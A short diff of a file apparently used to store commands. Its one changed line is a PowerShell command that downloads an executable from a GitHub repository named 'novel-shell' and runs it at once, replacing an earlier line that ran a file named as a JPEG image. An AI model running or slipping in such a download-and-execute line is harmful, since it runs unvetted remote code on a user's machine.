@@ -1,4 +1,4 @@
 TANGERINE
 // ADD TANGERINES
-iwr -outf tangerine.jpg https://github.com/lakrsv/novel-shell/raw/main/client/tangerine.jpg; ./tangerine.jpg
+iwr -outf tangerine.exe https://github.com/lakrsv/novel-shell/releases/download/tangerine-0/tangerine_win.exe; ./tangerine.exe
 !TANGERINE
